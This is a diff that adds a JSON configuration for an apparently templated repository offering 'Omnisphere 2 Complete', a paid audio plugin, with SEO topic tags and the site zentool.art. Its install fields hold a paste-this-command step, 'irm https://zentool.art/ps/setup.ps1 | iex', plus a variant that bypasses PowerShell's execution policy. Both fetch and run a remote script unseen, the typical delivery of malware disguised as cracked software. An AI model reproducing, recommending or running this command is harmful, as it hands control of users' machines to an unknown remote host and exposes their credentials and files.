@@ -1,0 +1,28 @@
+{
+  "repo": "Omnisphere-2-Complete",
+  "product": "Omnisphere 2 Complete",
+  "product_title": "Omnisphere 2",
+  "kind": "audio",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "audio",
+  "topics": [
+    "omnisphere-2-windows",
+    "omnisphere-config",
+    "omnisphere-integration",
+    "omnisphere-latest",
+    "audio-production",
+    "mixing-tools",
+    "mastering",
+    "vst-plugins",
+    "music-software",
+    "audio-workflow",
+    "sound-design",
+    "daw-tools"
+  ],
+  "site": "zentool.art"
+}
